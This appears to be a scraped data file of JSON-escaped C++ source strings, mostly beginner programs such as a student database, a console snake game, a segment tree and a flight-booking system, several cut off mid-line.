RegisterWindowClass(\"ALX_WIND",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <string>\n\nclass Student {\nprivate:\n    std::string name;\n    int id;\n    int age;\n    std::string major;\n\npublic:\n    Student(const std::string& name, int id, int age, const std::string& major)\n        : name(name), id(id), age(age), major(major) {}\n\n    const std::string& getName() const { return name; }\n    void setName(const std::string& name) { this->name = name; }\n\n    int getId() const { return id; }\n\n    int getAge() const { return age; }\n    void setAge(int age) { this->age = age; }\n\n    const std::string& getMajor() const { return major; }\n    void setMajor(const std::string& major) { this->major = major; }\n\n    void print() const {\n        std::cout << \"Name: \" << name << \", ID: \" << id << \", Age: \" << age << \", Major: \" << major << std::endl;\n    }\n};\n\nclass StudentDatabase {\nprivate:\n    Student** students;\n    int capacity;\n    int count;\n\npublic:\n    StudentDatabase(int capacity) : capacity(capacity), count(0) {\n        students = new Student * [capacity];\n    }\n\n    ~StudentDatabase() {\n        for (int i = 0; i < count; ++i) {\n            delete students[i];\n        }\n        delete[] students;\n    }\n\n    void addStudent(const Student& student) {\n        if (count < capacity) {\n            students[count++] = new Student(student);\n        }\n        else {\n            std::cerr << \"Database is full. Cannot add more students.\" << std::endl;\n        }\n    }\n\n    void removeStudent(int id) {\n        for (int i = 0; i < count; ++i) {\n            if (students[i]->getId() == id) {\n                delete students[i];\n                students[i] = students[count - 1];\n                students[--count] = nullptr;\n                std::cout << \"Student with ID \" << id << \" has been removed.\" << std::endl;\n                return;\n            }\n        }\n        std::cerr << \"Student with ID \" << id << \" not found.\" << std::endl;\n    }\n\n    Student* findStudent(int id) {\n        for (int i = 0; i < count; ++i) {\n            if (students[i]->getId() == id) {\n                return students[i];\n            }\n        }\n        return nullptr;\n    }\n\n    void listStudents() const {\n        std::cout << \"List of Students:\" << std::endl;\n        for (int i = 0; i < count; ++i) {\n            students[i]->print();\n        }\n    }\n\n    void saveToFile(const std::string& filename) const {\n        std::ofstream outFile(filename);\n        if (!outFile) {\n            std::cerr << \"Error opening file \" << filename << \" for writing.\" << std::endl;\n            return;\n        }\n\n        for (int i = 0; i < count; ++i) {\n            outFile << students[i]->getName() << \" \"\n                << students[i]->getId() << \" \"\n                << students[i]->getAge() << \" \"\n                << students[i]->getMajor() << std::endl;\n        }\n\n        outFile.close();\n        std::cout << \"Data saved to file: \" << filename << std::endl;\n    }\n\n    void loadFromFile(const std::string& filename) {\n        std::ifstream inFile(filename);\n        if (!inFile) {\n            std::cerr << \"Error opening file \" << filename << \" for reading.\" << std::endl;\n            return;\n        }\n\n        std::string name, major;\n        int id, age;\n        while (inFile >> name >> id >> age >> major) {\n            addStudent(Student(name, id, age, major));\n        }\n\n        inFile.close();\n        std::cout << \"Data loaded from file: \" << filename << std::endl;\n    }\n\n    void updateStudent(int id, const Student& newData) {\n        Student* student = findStudent(id);\n        if (student) {\n            student->setName(newData.getName());\n            student->setAge(newData.getAge());\n            student->setMajor(newData.getMajor());\n            std::cout << \"Student with ID \" << id << \" has been updated.\" << std::endl;\n        }\n        else {\n            std::cerr << \"Student with ID \" << id << \" not found.\" << std::endl;\n        }\n    }\n\n    void filterByMajor(const std::string& major) const {\n        std::cout << \"Students with major \" << major << \":\" << std::endl;\n        for (int i = 0; i < count; ++i) {\n            if (students[i]->getMajor() == major) {\n                students[i]->print();\n            }\n        }\n    }\n};\n\nint main() {\n    StudentDatabase database(10);\n\n    int choice;\n    do {\n        std::cout << \"\\nMenu:\\n\";\n        std::cout << \"1. Add Student\\n\";\n        std::cout << \"2. Remove Student\\n\";\n        std::cout << \"3. List Students\\n\";\n        std::cout << \"4. Save Data to File\\n\";\n        std::cout << \"5. Load Data from File\\n\";\n        std::cout << \"6. Update Student\\n\";\n        std::cout << \"7. Filter Students by Major\\n\";\n        std::cout << \"8. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice) {\n        case 1: {\n            std::string name, major;\n            int id, age;\n            std::cout << \"Enter student name: \";\n            std::cin >> name;\n            std::cout << \"Enter student ID: \";\n            std:",
    "#include <conio.h> \r\n#include <iostream>\r\n#include <string>\r\n#include <windows.h> \r\n\r\nusing namespace std; \r\n\r\n// Width & height\r\nint window[2] = {100, 25};\r\n\r\n// x, y coordinates\r\nint coords[2];\r\n\r\n// x, y coordinates of fruit and tail\r\nint fruitLoc[2];\r\nint tailLoc[2][100];\r\n\r\n// Length of tail\r\nint length;\r\n// Player's score\r\nint score;\r\n\r\n// Determine if is over or not, true or false\r\nbool isOver;\r\n\r\nenum keys {\r\n    STOP = 0,\r\n    LEFT,\r\n    RIGHT,\r\n    UP,\r\n    DOWN\r\n};\r\n\r\n// Get key direction\r\nkeys kDirection;\r\n\r\n// Initialize game variables, default settings\r\nvoid Init(void) {\r\n    isOver = false;\r\n\r\n    // Initial state of snake = paused\r\n    kDirection = STOP;\r\n\r\n    // Get midpoint\r\n    coords[0] = window[0] / 2;\r\n    coords[1] = window[1] / 2;\r\n\r\n    // Set random fruit location within window\r\n    fruitLoc[0] = rand() % window[0];\r\n    fruitLoc[1] = rand() % window[1];\r\n\r\n    score = 0; // Default and initial score\r\n}\r\n\r\n// Draw and lay out boundaries\r\nvoid Draw(void) {\r\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), {0,0});\r\n    CONSOLE_CURSOR_INFO info;\r\n    info.dwSize = 100;\r\n    info.bVisible = false;\r\n    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &info);\r\n\r\n    // Top border\r\n    for (int i = 0; i <= window[0]; i++) // Draw width of top border\r\n        cout << \"_\";\r\n    \r\n    cout << endl;\r\n    cout << endl;\r\n\r\n    // Heights\r\n    for (int i = 0; i <= window[1]; i++) {\r\n        for (int j = 0; j <= window[0]; j++) {\r\n            // Left and right borders\r\n            if (j == 0 || j == window[0])\r\n                cout << \"|\";\r\n\r\n            // Snake head\r\n            else if (i == coords[1] && j == coords[0]) // x & y coords\r\n                cout << \"O\";\r\n            \r\n            // Food\r\n            else if (i == fruitLoc[1] && j == fruitLoc[0])\r\n                cout << \"x\";\r\n\r\n            // Snake tail\r\n            else {\r\n                bool print = false;\r\n\r\n                for (int k = 0; k < length; k++) {\r\n                    if (i == tailLoc[1][k] && j == tailLoc[0][k]) {\r\n                        cout << \"+\";\r\n                        print = true;\r\n                    }\r\n                }\r\n\r\n                if (!print)\r\n                    cout << \" \";\r\n            }\r\n        }\r\n\r\n        cout << endl;\r\n    }\r\n\r\n    // Draw lower border\r\n    for (int i = 0; i <= window[0]; i++)\r\n        cout << \"_\";\r\n\r\n    cout << endl;\r\n    cout << \"\\nScore: \" << score << endl;\r\n}\r\n\r\n// Get user input to determine direction of snake\r\nvoid Input(void) {\r\n    if (_kbhit()) {\r\n        char key = _getch();\r\n\r\n        if (key == 'w' || key == 'W' || key == 72) {\r\n            if (kDirection != DOWN)\r\n                kDirection = UP;\r\n        }\r\n\r\n        if (key == 's' || key == 'S' || key == 80) {\r\n            if (kDirection != UP)\r\n                kDirection = DOWN;\r\n        }\r\n\r\n        if (key == 'a' || key == 'A' || key == 75) {\r\n            if (kDirection != RIGHT)\r\n                kDirection = LEFT;\r\n        }\r\n\r\n        if (key == 'd' || key == 'D' || key == 77) {\r\n            if (kDirection != LEFT)\r\n                kDirection = RIGHT;\r\n        }\r\n    }\r\n}\r\n\r\nvoid Update(void) {\r\n    // Update tail positions\r\n    for (int i = length - 1; i > 0; --i) {\r\n        tailLoc[0][i] = tailLoc[0][i - 1];\r\n        tailLoc[1][i] = tailLoc[1][i - 1];\r\n    }\r\n\r\n    // Move the head to the new position\r\n    tailLoc[0][0] = coords[0]; // x coordinate\r\n    tailLoc[1][0] = coords[1]; // y coordinate\r\n\r\n    // Move the head based on the direction\r\n    switch (kDirection) {\r\n        case UP:\r\n            coords[1]--;\r\n            break;\r\n        case DOWN:\r\n            coords[1]++;\r\n            break;\r\n        case LEFT:\r\n            coords[0]--;\r\n            break;\r\n        case RIGHT:\r\n            coords[0]++;\r\n            break;\r\n        default:\r\n            break;\r\n    }\r\n\r\n    // Check for collisions with the borders\r\n    if (coords[0] < 0 || coords[0] > window[0] || coords[1] < 0 || coords[1] > window[1])\r\n        isOver = true;\r\n\r\n    // Check for collisions with the tail\r\n    for (int i = 0; i < length; i++) {\r\n        if (coords[0] == tailLoc[0][i] && coords[1] == tailLoc[1][i])\r\n            isOver = true;\r\n    }\r\n\r\n    // Check if eaten food and update score\r\n    if (coords[0] == fruitLoc[0] && coords[1] == fruitLoc[1]) {\r\n        score += 100;\r\n        fruitLoc[0] = rand() % window[0];\r\n        fruitLoc[1] = rand() % window[1];\r\n        length++;\r\n    }\r\n}\r\n\r\nint main() {\r\n    Init(); // Initialize the game\r\n\r\n    // As long as it is not game over\r\n    while (!isOver) {\r\n        Draw(); // Draw the boundaries\r\n        Input(); // Get user input\r\n        Update(); // Update game\r\n        Sleep(10);\r\n    }\r\n\r\n    // Once isOver = true\r\n    cout << \"GGs!\" << endl;\r\n    return 0;\r\n}",
    "#include \"Volunteer.h\"\n\nVolunteer::Volunteer(int id, const string &name): completedOrderId(NO_ORDER), activeOrderId(NO_ORDER), id(id),name(name),isAvailable(true){\n\n}\nint Volunteer::getId() const{\n    return id;\n}\n\nconst string &Volunteer::getName() const{\n    return name;\n}\nint Volunteer::getActiveOrderId() const{\n    return activeOrderId;\n}\nvoid Volunteer::resetCompletedOrderId(){\n    completedOrderId = NO_ORDER;\n}\nint Volunteer::getCompletedOrderId() const{\n    return completedOrderId;\n}\nbool Volunteer::isBusy() const{\n    return !isAvailable;\n}\nvoid Volunteer::setIsAvailable(bool s){\n    isAvailable = s;\n}\nVolunteer::~Volunteer(){}\n\n\n\nCollectorVolunteer::CollectorVolunteer(int id, string name, int coolDown):Volunteer(id,name), coolDown(coolDown), timeLeft(-1) {\n\n}\n\nCollectorVolunteer *CollectorVolunteer::clone() const {\n    return new CollectorVolunteer(*this);\n}\nstring CollectorVolunteer::getVolunteerType(const Volunteer &volunteer){\n    return \"Collector\";\n}\nvoid CollectorVolunteer::step() {\n    bool indicator = decreaseCoolDown();\n    if (indicator == true){\n        completedOrderId = activeOrderId;\n        activeOrderId = NO_ORDER;\n        setIsAvailable(true);\n        //if collecting is completed, move order from in process vector to pending vector, keep status\n    }\n}\n\nint CollectorVolunteer::getCoolDown() const{\n    return coolDown;\n}\n\nint CollectorVolunteer::getTimeLeft() const{\n    return timeLeft;\n}\n\nvoid CollectorVolunteer::setTimeLeft(int timeLeft){\n    this->timeLeft = timeLeft;\n}\n\nbool CollectorVolunteer::decreaseCoolDown(){\n    timeLeft--;\n    return timeLeft == 0;}\n    //Decrease timeLeft by 1,return true if timeLeft=0,false otherwise\nbool CollectorVolunteer::hasOrdersLeft() const{\n    return true;\n}\n\nbool CollectorVolunteer::canTakeOrder(const Order &order) const{\n    return !isBusy()&&order.getStatus()==OrderStatus::PENDING;\n}\nvoid CollectorVolunteer::acceptOrder(const Order &order){ \n    if(canTakeOrder(order)){\n        activeOrderId=order.getId();\n        timeLeft=coolDown; \n        setIsAvailable(false);\n        //check if we should move order from pending vector to in process vector? change the order status to COLLECTING\n        \n    }\n}\nstring CollectorVolunteer::toString() const {\n    string out = \"VolunteerID: \" + std::to_string(getId());\n    out += \"\\nisBusy: \";\n    out += (isBusy() ? \"true\" : \"false\");\n    out += \"\\nOrderId: \";\n    out += (isBusy() ? std::to_string(activeOrderId) + \" \": \"None\");\n    out += \"\\nTimeLeft: \";\n    out += (activeOrderId != -1 ? std::to_string(getTimeLeft()) + \" \": \"None\");\n    out += \"\\nOrdersLeft: No Limit\\n\";\n    return out;\n}\n    \n\nLimitedCollectorVolunteer::LimitedCollectorVolunteer(int id, string name, int coolDown ,int maxOrders):\n    CollectorVolunteer(id, name, coolDown), maxOrders(maxOrders), ordersLeft(maxOrders){\n\n}\nLimitedCollectorVolunteer *LimitedCollectorVolunteer::clone() const {\n    return new LimitedCollectorVolunteer(*this);\n}\nbool LimitedCollectorVolunteer::hasOrdersLeft() const {\n    return ordersLeft > 0;\n}\nbool LimitedCollectorVolunteer::canTakeOrder(const Order &order) const {\n    return !isBusy() && hasOrdersLeft()&&order.getStatus()==OrderStatus::PENDING;\n}\nvoid LimitedCollectorVolunteer::acceptOrder(const Order &order) {\n\n    if(canTakeOrder(order)){\n        activeOrderId=order.getId();\n        setTimeLeft(getCoolDown());\n        ordersLeft--;\n        setIsAvailable(false);\n    }\n}\n\n\nint LimitedCollectorVolunteer::getMaxOrders() const{\n    return maxOrders;\n}\nint LimitedCollectorVolunteer::getNumOrdersLeft() const{\n    return ordersLeft;\n}\nstring LimitedCollectorVolunteer::toString() const {\n    string out = \"VolunteerID: \" + std::to_string(getId());\n    out += \"\\nisBusy: \";\n    out += (isBusy() ? \"true\" : \"false\");\n    out += \"\\nOrderId: \";\n    out += (isBusy() ? std::to_string(activeOrderId) + \" \": \"None\");\n    out += \"\\nTimeLeft: \";\n    out += (activeOrderId != -1 ? std::to_string(getTimeLeft()) + \" \": \"None\");\n    out += \"\\nOrdersLeft: \" + std::to_string(ordersLeft);\n    out += \"\\n\";\n    return out;\n}\nstring LimitedCollectorVolunteer::getVolunteerType(const Volunteer &volunteer){\n    return \"LimitedCollectorVolunteer\";\n}    \n\nDriverVolunteer::DriverVolunteer(int id, string name, int maxDistance, int distancePerStep): Volunteer(id, name),\n    maxDistance(maxDistance), distancePerStep(distancePerStep), distanceLeft(){//check this later\n\n}\nDriverVolunteer *DriverVolunteer::clone() const {\n    return new DriverVolunteer(*this);\n}\n\nint DriverVolunteer::getDistanceLeft() const{\n    return distanceLeft;\n}\nstring DriverVolunteer::getVolunteerType(const Volunteer &volunteer){\n    return \"DriverVolunteer\";\n}    \nint DriverVolunteer::getMaxDistance() const {\n    return maxDistance;\n}\nint DriverVolunteer::getDistancePerStep() const{\n    return distancePerStep;\n}  \nbool DriverVolunteer::decreaseDistanceLeft(){\n    setDistanceLeft(distanceLeft - distancePerStep);\n    if (distanceLeft < 0){\n        setDistanceLeft(0);\n    }\n    retur",
    "using namespace std;\n#include<iostream>\n#include<fstream>\n#include<string>\n\nint main() {\n\tstring baris;\n\tstring NamaFile;\n\n\tcout << \"Masukkan Nama File : \";\n\tcin >> NamaFile;\n\n\t//membuka file dalam mode menulis.\n\tofstream outfile;\n\t//menunjuk ke sebuah nama file\n\toutfile.open(NamaFile + \".txt\", ios::out);\n\n\tcout << \">Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\t//unlimited loop untuk menulis\n\twhile (true) {\n\t\tcout << \"- \";\n\t\t//mendapatkan setiap karakter dalam satu baris\n\t\tgetline(cin, baris);\n\t\t//loop akan berhenti jika anda memasukan karakter q\n\t\tif (baris == \"q\")break;\n\t\t//menulis dan memasukan nilai dari baris 'baris' ke dalam file\n\t\toutfile << baris << endl;\n\t}\n\t//selesai dalam menulis sekarang  tutup filenya\n\toutfile.close();\n\n\t//membuuka file dalam mode membaca\n\tifstream infile;\n\t\n\t//menunjuk ke sebuah file\n\tinfile.open(NamaFile + \".txt\", ios::in);\n\n\tcout << endl << \">= Membuka dan membaca file \" << endl;\n\t//jika file ada maka\n\tif (infile.is_open())\n\t{\n\t\t//melakukan perulangan setiapp baris\n\t\twhile (getline(infile, baris))\n\t\t{\n\t\t\t//dan tampilkan di sini\n\t\t\tcout << baris << \"\\n\";\n\t\t}\n\t\t//tutup file tersebut setelah selesai\n\t\tinfile.close();\n\t}\n\t//jika tidak ditemukan file maka akan menampilkan ini\n\telse cout << \"Unable to open file\";\n\treturn 0;\n\n}",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <cstdio>\r\n#include <cstring>\r\n#include<string>\r\nusing namespace std;\r\n\r\n/// This macro definition denotes the maximum number of logical operators the program can handle.\r\n#define z 100000\r\n\r\n/// @brief Number of unique propositional atoms\r\nint h;\r\n\r\n/// @brief This string is used to store the postorder notation of the logic formula via parse tree\r\n///\r\n/// @see postorder() main() \r\nstring final=\"\";\r\n\r\n/// Class which defines each node and each leaf on the binary tree\r\n///\r\n/// ###variable\r\n/// char d stores the data of the unit in the tree\r\n///\r\n/// Maketree *l *r they store the address of the left and right leaf of the current node respectively\r\nclass MakeTree \r\n{\r\n   public: char d; \r\n   MakeTree *l, *r; \r\n   MakeTree(char d){ \r\n      this->d = d;\r\n      this->l = NULL;\r\n      this->r = NULL;\r\n   }\r\n};\r\n\r\n/// Class which defines stack formation particularly for the prefix to binary tree convertion \r\n///\r\n/// ###Variable\r\n///\r\n/// MakeTree *treeN It creates a object to class MakeTree which can be used to point each unit in Binary Tree\r\n///\r\n/// MakeStack *n It creates local object to the MakeStack class\r\nclass MakeStack\r\n{\r\n   public: MakeTree *treeN;\r\n   MakeStack *n;\r\n   MakeStack(MakeTree*treeN)\r\n   {\r\n      this->treeN = treeN;\r\n      n = NULL;\r\n   }\r\n};\r\n\r\n/// class which defines the binary tree and envolves all functions which convert prefix expresion to binary tree\r\n/// ###variable\r\n///\r\n/// MakeStack *top stores address of topmost unit in the tree\r\n///\r\n/// MakeTree *ptr usual pointer used to point a unit in the tree\r\n///\r\n/// MakeStack *nptr usual pointer used to point a unit in the tree \r\n///\r\n///int lDepth length of thr left side of the tree\r\n///\r\n///int rDepth length of thr right side of the tree\r\nclass SecondaryTree {\r\n   private: MakeStack *top;\r\n   public: SecondaryTree() {\r\n      top = NULL;\r\n   }\r\n   /// function to clear the stack \r\n   void clear() {\r\n      top = NULL;\r\n   }\r\n    /// function to push the value in the stack\r\n    /// @param ptr which is address of the value which has to be added\r\n    /// function checks if the top is null which means currently stack is empty and then adds the value otherwise just replaces top address with the new value address.\r\n   /// @see pop()\r\n   void push(MakeTree *ptr) {\r\n      if (top == NULL)\r\n        { top = new MakeStack(ptr);\r\n         }\r\n      else {\r\n         MakeStack *nptr = new MakeStack(ptr);\r\n         nptr->n = top;\r\n         top = nptr;\r\n\r\n      }\r\n   }\r\n    /// function to pop out the uppermost value in the stack\r\n    /// @returns ptr which is the top most value in the stack currently.\r\n    ///\r\n    /// checks if the stack is empty and if its empty prints underflow.\r\n    ///\r\n    /// otherwise just pops out the topmost value and deletes it from stack.\r\n    /// @see push()\r\n   MakeTree *pop() {\r\n      if (top == NULL) {\r\n         cout<<\"Underflow\"<<endl;\r\n      } else {\r\n         MakeTree *ptr = top->treeN;\r\n         top = top->n;\r\n\r\n         return ptr;\r\n      }\r\n   }\r\n    /// function to find the address of the root of tree\r\n    ///\r\n    /// @returns address of the root\r\n   MakeTree *seek() {\r\n\r\n      return top->treeN;\r\n   }\r\n\r\n    /// @param val its the bit by bit value in the given expression\r\n    ///\r\n    /// function checks if the the current alphabet is atom or operator and adds them in the tree like their respective properties\r\n    ///\r\n    /// else returns Invalid Expression\r\n    ///\r\n    /// @see FormTree() the function gets each string letter from the loop in FormTree function \r\n    /// @see push() \r\n    /// @see pop()\r\n   void insert(char val) {\r\n      if (if_Digit(val)) {\r\n         MakeTree *nptr = new MakeTree(val);\r\n         push(nptr);\r\n      } else if (if_Operator(val)) {\r\n         MakeTree *nptr = new MakeTree(val);\r\n        if(val=='~'){\r\n        nptr->l=NULL;\r\n        nptr->r=pop();\r\n        push(nptr);\r\n        }\r\n        else\r\n         {nptr->l = pop();\r\n         nptr->r= pop();\r\n         push(nptr);\r\n      } }\r\n\r\n\r\n      else {\r\n         cout<<\"Invalid Expression\"<<endl;\r\n         return;\r\n      }\r\n   }\r\n\r\n    /// function checks if the current alphabet is an atom or not\r\n    ///\r\n    /// @returns boolean value \r\n    ///\r\n    /// @see if_operator(char ch) both have the same feature\r\n   bool if_Digit(char ch) {\r\n      return ((ch >= 65 && ch <= 90)||(ch>=97 && ch<=122));\r\n   }\r\n\r\n    /// function checks if the current alphabet is an operator or not\r\n    ///\r\n    /// @returns boolean value \r\n    ///\r\n    /// @see if_Digit(char ch) both have the same feature\r\n   bool if_Operator(char ch) {\r\n      return ch == '+' || ch == '~' || ch == '*' || ch == '>';\r\n   }\r\n    /// function converts characters to digits in ASCII values\r\n    ///\r\n    /// @param ch which is to converted to digit\r\n    ///\r\n    /// @returns digit value \r\n   int toDigit(char ch) {\r\n      return ch - '0';\r\n   }\r\n\r\n    /// function runs a loop to insert each alphabet sequentially as its properties into the ",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nclass SegmentTree {\npublic:\n    vector<int> tree;\n    vector<int> lazy;\n    string binary;\n    int n;\n\n    SegmentTree(string& str) {\n        binary = str;\n        n = binary.length();\n        tree.assign(4 * n, 0);\n        lazy.assign(4 * n, 0);\n        build(1, 0, n - 1);\n    }\n\n    void build(int node, int left, int right) {\n        if (left == right) {\n            tree[node] = binary[left] - '0';\n        } else {\n            int mid = (left + right) / 2;\n            build(2 * node, left, mid);\n            build(2 * node + 1, mid + 1, right);\n            tree[node] = tree[2 * node] + tree[2 * node + 1];\n        }\n    }\n\n    void propagate(int node, int left, int right) {\n        if (lazy[node] % 2 != 0) {\n            tree[node] = (right - left + 1) - tree[node];\n            if (left != right) {\n                lazy[2 * node] += lazy[node];\n                lazy[2 * node + 1] += lazy[node];\n            }\n            lazy[node] = 0;\n        }\n    }\n\n    void update(int node, int left, int right, int ql, int qr) {\n        propagate(node, left, right);\n        if (ql > right || qr < left) {\n            return;\n        }\n        if (ql <= left && right <= qr) {\n            tree[node] = (right - left + 1) - tree[node];\n            if (left != right) {\n                lazy[2 * node]++;\n                lazy[2 * node + 1]++;\n            }\n            return;\n        }\n        int mid = (left + right) / 2;\n        update(2 * node, left, mid, ql, qr);\n        update(2 * node + 1, mid + 1, right, ql, qr);\n        tree[node] = tree[2 * node] + tree[2 * node + 1];\n    }\n\n    int query(int node, int left, int right, int ql, int qr) {\n        propagate(node, left, right);\n        if (ql > right || qr < left) {\n            return 0;\n        }\n        if (ql <= left && right <= qr) {\n            return tree[node];\n        }\n        int mid = (left + right) / 2;\n        int left_count = query(2 * node, left, mid, ql, qr);\n        int right_count = query(2 * node + 1, mid + 1, right, ql, qr);\n        return left_count + right_count;\n    }\n\n    void range_update(int ql, int qr) {\n        update(1, 0, n - 1, ql, qr);\n    }\n\n    int range_query(int ql, int qr) {\n        return query(1, 0, n - 1, ql, qr);\n    }\n};\n\nint main() {\n    ios_base::sync_with_stdio(0);cin.tie(0);cout.tie(0);\n    int t;\n    cin >> t;\n\n    for (int tc = 1; tc <= t; ++tc) {\n        string binary;\n        cin >> binary;\n        int n = binary.length();\n\n        int q;\n        cin >> q;\n\n        SegmentTree st(binary);\n\n        cout << \"Case \" << tc << \":\" << '\\n';\n\n        while (q--) {\n            char op;\n            cin >> op;\n\n            if (op == 'I') {\n                int i, j;\n                cin >> i >> j;\n                st.range_update(i - 1, j - 1); // Convert to 0-based index\n            } else if (op == 'Q') {\n                int i;\n                cin >> i;\n                int result = st.range_query(i - 1, i - 1); // Convert to 0-based index\n                cout << result << '\\n';\n            }\n        }\n    }\n\n    return 0;\n}\n",
    "// ascending_order_function_sortation.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n\r\n#include <iostream>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cout << \"Enter the number of elements in the array: \";\r\n    cin >> n;\r\n\r\n    int* arr = new int[n];\r\n\r\n    // Input array elements from the user \r\n    cout << \"Enter the elements of the array: \" << endl;\r\n    for (int i = 0; i < n; ++i)\r\n    {\r\n        cout << \"Element \" << i + 1 << \": \";\r\n        cin >> arr[i];\r\n    }\r\n\r\n    // Display unsorted array elements\r\n    cout << \"\\n Unsorted array elements: \\n\";\r\n    for (int i = 0; i < n; ++i)\r\n    {\r\n        cout << arr[i] << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    // sort array elements in ascending order\r\n    sort(arr, arr + n);\r\n\r\n    // Display sorted array elements\r\n    cout << \"\\n Sorted array elements in ascending order: \\n\";\r\n    for (int i = 0; i < n; ++i)\r\n    {\r\n        cout << arr[i] << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    // free dynamically allocated memory \r\n    delete[] arr;\r\n\r\n    return 0;\r\n}\r\n\r\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\r\n// Debug program: F5 or Debug > Start Debugging menu\r\n\r\n// Tips for Getting Started: \r\n//   1. Use the Solution Explorer window to add/manage files\r\n//   2. Use the Team Explorer window to connect to source control\r\n//   3. Use the Output window to see build output and other messages\r\n//   4. Use the Error List window to view errors\r\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\r\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\r\n",
    "    #include <iostream>\r\n    #include <chrono>\r\n    #include <vector>\r\n    #include <algorithm>\r\n    #include <string>\r\n    #include <ctime>\r\n    #include <iomanip>\r\n    #include <sstream>\r\n    #include <conio.h>\r\n\r\n    using namespace std;\r\n    class Vol;\r\n    class Avion;\r\n\r\n    class Passager {\r\n    public:\r\n        int identifiant;\r\n        string nom, prenom, telephone, adresse;\r\n        int age;\r\n\r\n        Passager(int id, string n, string p, int a, string tel, string adr)\r\n            : identifiant(id), nom(n), prenom(p), age(a), telephone(tel), adresse(adr) {}\r\n\r\n        void afficher() const {\r\n            cout << \"Passager \" << identifiant << \": \" << nom << \" \" << prenom << \", \" << age << \" ans, Tel: \" << telephone << \", Adresse: \" << adresse << endl;\r\n        }\r\n\r\n        static void creerPassagerSansVol() {\r\n            int identifiant;\r\n            string nom, prenom, telephone, adresse;\r\n            int age;\r\n\r\n            cout << \"Enter Passenger Details:\" << endl;\r\n            cout << \"ID: \";\r\n            cin >> identifiant;\r\n            cout << \"First Name: \";\r\n            cin >> nom;\r\n            cout << \"Last Name: \";\r\n            cin >> prenom;\r\n            cout << \"Age: \";\r\n            cin >> age;\r\n            cout << \"Telephone: \";\r\n            cin >> telephone;\r\n            cout << \"Address: \";\r\n            cin >> adresse;\r\n\r\n            Passager passager(identifiant, nom, prenom, age, telephone, adresse);\r\n            tableauPassagers.push_back(passager);\r\n\r\n            cout << \"Passenger created successfully!\" << endl;\r\n        }\r\n\r\n        static void afficherPassagers() {\r\n            cout << \"Liste des passagers:\" << endl;\r\n            for (const auto& passager : tableauPassagers) {\r\n                passager.afficher();\r\n            }\r\n        }\r\n        \r\n\r\n    private:\r\n        static vector<Passager> tableauPassagers;\r\n\r\n        friend class Vol;\r\n\r\n    };\r\n\r\n    vector<Passager> Passager::tableauPassagers;\r\n\r\n    class Avion {\r\n    public:\r\n        string code, pilote, modele, date_fabrication;\r\n        int capacite, nb_vols;\r\n\r\n        Avion(string c, string pil, string mod, int cap, string date, int nb)\r\n            : code(c), pilote(pil), modele(mod), capacite(cap), date_fabrication(date), nb_vols(nb) {}\r\n\r\n        void afficher() const {\r\n            cout << \"Avion \" << code << \": Pilote: \" << pilote << \", Mod\u00e8le: \" << modele << \", Capacit\u00e9: \" << capacite << \", Fabriqu\u00e9 le \" << date_fabrication << \", \" << nb_vols << \" vols effectu\u00e9s\" << endl;\r\n        }\r\n\r\n        static void afficherAvions() {\r\n            cout << \"Liste des avions:\" << endl;\r\n            for (const auto& avion : tableauAvions) {\r\n                avion.afficher();\r\n            }\r\n        }\r\n        static void ajouterAvion() {\r\n        string code, pilote, modele, date_fabrication;\r\n        int capacite, nb_vols;\r\n\r\n        cout << \"Enter Aircraft Details:\" << endl;\r\n        cout << \"Code: \";\r\n        cin >> code;\r\n        cout << \"Pilot: \";\r\n        cin >> pilote;\r\n        cout << \"Model: \";\r\n        cin >> modele;\r\n        cout << \"Capacity: \";\r\n        cin >> capacite;\r\n        cout << \"Manufacture Date: \";\r\n        cin >> date_fabrication;\r\n        cout << \"Number of Flights: \";\r\n        cin >> nb_vols;\r\n\r\n        Avion avion(code, pilote, modele, capacite, date_fabrication, nb_vols);\r\n\r\n        Avion::tableauAvions.push_back(avion);\r\n\r\n        cout << \"Aircraft added successfully!\" << endl;\r\n    }\r\n\r\n        static vector<Avion> tableauAvions;\r\n    };\r\n\r\n    vector<Avion> Avion::tableauAvions;\r\n\r\n    class Vol {\r\n    public:\r\n        Avion avion;\r\n        vector<Passager> passagers;\r\n        tm date_depart, date_arrivee;\r\n\r\n        Vol(Avion a, vector<Passager> p, tm depart, tm arrivee)\r\n            : avion(a), passagers(p), date_depart(depart), date_arrivee(arrivee) {}\r\n\r\n        void afficher() const {\r\n            cout << \"Flight Information:\" << endl;\r\n            avion.afficher();\r\n            cout << \"Departure Date: \" << formatDate(date_depart) << \", Arrival Date: \" << formatDate(date_arrivee) << endl;\r\n            cout << \"Passenger List:\" << endl;\r\n            for (const auto& passager : passagers) {\r\n                passager.afficher();\r\n            }\r\n            cout << \"----------------------\" << endl;\r\n        }\r\n\r\n        static void ajouterVol() {\r\n            while (true) {\r\n                string code, pilote, modele, date_fabrication, date_depart_str, date_arrivee_str;\r\n                int capacite, nb_vols;\r\n\r\n                cout << \"Enter Flight Details:\" << endl;\r\n                cout << \"Code: \";\r\n                cin >> code;\r\n                cout << \"Pilot: \";\r\n                cin >> pilote;\r\n                cout << \"Model: \";\r\n                cin >> modele;\r\n                cout << \"Capacity: \";\r\n                cin >> capacite;\r\n                cout << \"Manufacture Date: \";\r\n                cin >> date_fabrication;\r\n                cout << \"Number of Flights: \";\r\n         ",
